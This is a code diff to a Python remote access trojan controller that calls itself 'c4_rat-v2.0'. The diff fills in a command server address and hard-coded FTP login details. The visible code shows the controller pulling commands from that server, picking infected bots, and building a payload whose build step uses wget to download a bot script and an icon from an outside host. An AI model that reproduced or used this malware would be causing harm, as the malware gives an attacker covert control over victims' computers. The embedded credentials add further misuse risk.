@@ -26,14 +26,14 @@ hacker = "cr4sh3r"
 
 # Server url
 
-ser = "http://www.example.net/"
+ser = "http://www.test22a.netau.net/"
 
 # Server ftp data
 
-ser_host = 'ftp.example.net'
-ser_logi = 'username'
-ser_pasi = '1234'
-ser_myurl = 'www.example.net'
+ser_host = 'ftp.test22a.netau.net'
+ser_logi = 'a8757687'
+ser_pasi = '7589aabcd9'
+ser_myurl = 'www.test22a.netau.net'
 
 # Server id
 
@@ -102,11 +102,6 @@ def screenlog():
     scit.pack(anchor = "center", side = "top")
     sccie.pack(anchor = "center", side = "top")
 
-
-
-
-
-
     # Main loop
 
     screenlogmen.mainloop()
@@ -133,9 +128,6 @@ def cmdcon():
         updatz79 = usock.read()
         usock.close()
         time.sleep(5)
-
-
-
 
         global cta
         cta = updatz79
@@ -169,8 +161,6 @@ def cmdcon():
         ftp.cwd("../")
         ftp.cwd("../")
         ftp.cwd("../")
-
-
 
 
     # Window
@@ -347,10 +337,6 @@ def bot_selection():
             botselmen.destroy()
             ctypes.windll.user32.MessageBoxA(0, sume, "c4_rat-v2.0", 1)
             menu()
-
-
-
-
 
 
     # Explanatory text
@@ -613,9 +599,7 @@ def build():
         return vir_myurl
 
     def buildit():
-        # Bot.py -- auxiliary link
         wget.download('http://zepikao.my3gb.com/Sh3lz/base.py')
-        # Default icon
         wget.download('http://zepikao.my3gb.com/Sh3lz/t.ico')
         texthe = '''
 #! python2
@@ -787,9 +771,6 @@ def login():
     lt = Tkinter.Label(text = "Insert your password:")
     lt.configure(background = "#333", foreground="white")
     e1.bind("<Return>", getusr)
-
-
-
 
 
     # Packing...
